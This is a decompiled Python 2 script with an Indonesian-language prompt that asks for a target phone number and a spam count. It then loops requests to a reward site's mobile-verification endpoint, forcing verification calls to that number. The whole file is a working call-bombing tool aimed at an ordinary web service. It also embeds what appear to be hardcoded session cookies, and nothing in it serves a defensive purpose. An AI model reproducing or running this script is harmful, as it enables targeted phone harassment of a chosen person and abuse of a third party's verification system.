# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name:  
import os, sys, time, requests
from requests import post
lod = '\xe2\x96\x90'

def bersih():
    os.system('clear')


def balik():
    d = raw_input('Coba lagi? (y/t):')
    if d == 'y':
        os.system('cd $home')
        os.system('python2 call.py')
    elif d == 't':
        print '\x1b[1;91mExit'
        os.system('exit')


def wr(s):
    for i in s + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(1.0 / 1000)


bersih()
print '\x1b[1;36m'
wr('  ____      _ _       ____\n / ___|__ _| | |_   _|___ \\  \n| |   / _` | | \\ \\ / / __) | \n| |__| (_| | | |\\ V / / __/  \n \\____\\__,_|_|_| \\_/ |_____| \n')
banner = '\n\x1b[1;97m\n\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\nAuthor  \x1b[1;91m  :\x1b[1;96mMRROBO28\x1b[1;97m\ngithub  \x1b[1;91m  :\x1b[1;96mhttps://github.com/MRROBO28\x1b[1;97m\nInstagram \x1b[1;91m:\x1b[1;92m@irshad_faqih\x1b[1;97m\nyoutube  \x1b[1;91m :\x1b[1;92mTEKTRIKBOT CN\x1b[1;97m\n\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\nGunakan format\x1b[1;33m(88*******)\n'
wr(banner)
no = int(input('\x1b[1;37m[\x1b[1;36mno target\x1b[1;37m] > \x1b[1;33m'))
jm = int(input('\x1b[1;97m[\x1b[1;96mmasukan jumlah spam\x1b[1;97m]> \x1b[1;93m'))
print '\x1b[1;33mLoading...\x1b[33;1m'
time.sleep(2)
head = {'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36', 
   'Content-Type': ' application/x-www-form-urlencoded; charset=UTF-8', 
   'Content-Type': 'application/json', 
   'Origin': 'https://id.jagreward.com', 
   'Referer': 'https://id.jagreward.com/member/register/', 
   'Accept-Encoding': 'gzip, deflate, br', 
   'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
   '__cfduid': 'd4de1e7ea2ced09ecde54a568af1ac50b1584709816', 
   '_ga': 'GA1.2.2037151396.1584709855', 
   'PHPSESSID': 'n88pmtvvsdpf25898a9jeqbggc', 
   'DAPROPS': 'sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0'}
bro = {'method': 'CALL', 'countryCode': 'id'}
url = 'https://id.jagreward.com/member/verify-mobile/' + str(no)

def kirim():
    try:
        for i in range(jm):
            r = requests.get(url, data=bro, headers=head)
            print ('[Result:', r.json()['result'], '[Status]:', r.json()['message'])
            time.sleep(3)

    except KeyboardInterrupt:
        print '\x1b[1;31mStop!!'


kirim()
balik()